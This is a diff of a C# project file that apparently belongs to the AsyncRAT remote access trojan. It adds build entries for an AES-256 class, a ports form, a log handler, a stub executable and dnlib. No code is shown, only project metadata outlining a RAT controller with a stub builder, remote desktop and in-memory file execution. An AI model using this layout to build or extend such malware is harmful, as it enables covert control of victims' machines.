@@ -60,6 +60,7 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Cryptography\Aes256.cs" />
     <Compile Include="Forms\Builder.cs">
       <SubType>Form</SubType>
     </Compile>
@@ -71,6 +72,12 @@
     </Compile>
     <Compile Include="Forms\Form1.Designer.cs">
       <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\PortsFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\PortsFrm.Designer.cs">
+      <DependentUpon>PortsFrm.cs</DependentUpon>
     </Compile>
     <Compile Include="Forms\ProcessManager.cs">
       <SubType>Form</SubType>
@@ -84,6 +91,7 @@
     <Compile Include="Forms\RemoteDesktop.Designer.cs">
       <DependentUpon>RemoteDesktop.cs</DependentUpon>
     </Compile>
+    <Compile Include="Handle Packet\HandleLogs.cs" />
     <Compile Include="Handle Packet\HandlePacket.cs" />
     <Compile Include="Helper\Methods.cs" />
     <Compile Include="MessagePack\BytesTools.cs" />
@@ -98,6 +106,11 @@
     </Compile>
     <Compile Include="Forms\SendFileToMemory.Designer.cs">
       <DependentUpon>SendFileToMemory.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
     <Compile Include="Settings.cs" />
     <Compile Include="Socket\Clients.cs" />
@@ -138,6 +151,9 @@
     <EmbeddedResource Include="Forms\Form1.resx">
       <DependentUpon>Form1.cs</DependentUpon>
     </EmbeddedResource>
+    <EmbeddedResource Include="Forms\PortsFrm.resx">
+      <DependentUpon>PortsFrm.cs</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Forms\ProcessManager.resx">
       <DependentUpon>ProcessManager.cs</DependentUpon>
     </EmbeddedResource>
@@ -146,14 +162,9 @@
     </EmbeddedResource>
     <EmbeddedResource Include="Properties\Resources.resx">
       <Generator>ResXFileCodeGenerator</Generator>
-      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
       <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
     </EmbeddedResource>
-    <Compile Include="Properties\Resources.Designer.cs">
-      <AutoGen>True</AutoGen>
-      <DependentUpon>Resources.resx</DependentUpon>
-      <DesignTime>True</DesignTime>
-    </Compile>
     <EmbeddedResource Include="Forms\SendFileToMemory.resx">
       <DependentUpon>SendFileToMemory.cs</DependentUpon>
     </EmbeddedResource>
@@ -172,12 +183,14 @@
     <None Include="App.config" />
   </ItemGroup>
   <ItemGroup>
-    <None Include="Resources\Plugin.dll" />
+    <None Include="Resources\AsyncRAT-Sharp.exe.config" />
   </ItemGroup>
   <ItemGroup>
     <Content Include="async_icon.ico" />
+    <None Include="Resources\Stub.exe" />
     <None Include="Resources\cGeoIp.dll" />
-    <None Include="bin\Debug\cGeoIp.dll" />
+    <None Include="Resources\Plugin.dll" />
+    <None Include="Resources\dnlib.dll" />
   </ItemGroup>
   <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
